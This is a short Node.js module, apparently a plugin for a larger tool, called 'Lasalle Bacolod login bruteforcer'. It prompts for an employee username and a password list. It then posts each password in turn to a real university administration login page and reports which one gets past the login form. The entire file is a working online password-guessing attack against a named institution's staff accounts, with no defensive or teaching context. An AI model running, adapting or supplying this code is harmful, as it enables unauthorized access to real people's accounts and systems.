//Dependencies
const Request = require("request")

//Main
function info(){
    return {
        "name": "Lasalle Bacolod login bruteforcer",
        "author": "I2rys"
    }
}

function bruteforce(Fs, Chalk, Readline){
    Readline.question(`${Chalk.blueBright("username: ")}`, username=>{
        Readline.question(`${Chalk.blueBright("dictionary: ")}`, dictionary=>{
            var dictionary_data = Fs.readFileSync(dictionary, "utf8")
            dictionary_data = dictionary_data.replace(/\r/g, "").split("\n")

            var dictionary_index = 0
        
            Check()
            function Check(){
                if(dictionary_index == dictionary_data.length){
                    console.log(`${info().name} is finished bruteforcing.`)
                    process.exit()
                }
            
                Request.post("http://apps.usls.edu.ph/admin/index.php/account/login/index", {
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    body: `emp_id=${username}&password=${dictionary_data[dictionary_index]}&login=1`
                }, function(err, res, body){
                    if(body.indexOf('<div class="login-form-wrapper">') == -1){
                        console.log(`Valid password ${dictionary_data[dictionary_index]}`)
                    }else{
                        console.log(`Invalid password ${dictionary_data[dictionary_index]}`)
                    }
            
                    dictionary_index += 1
                    Check()
                })
            }
        })
    })
}

//Exporter
module.exports = {
    info: info,
    bruteforce: bruteforce
}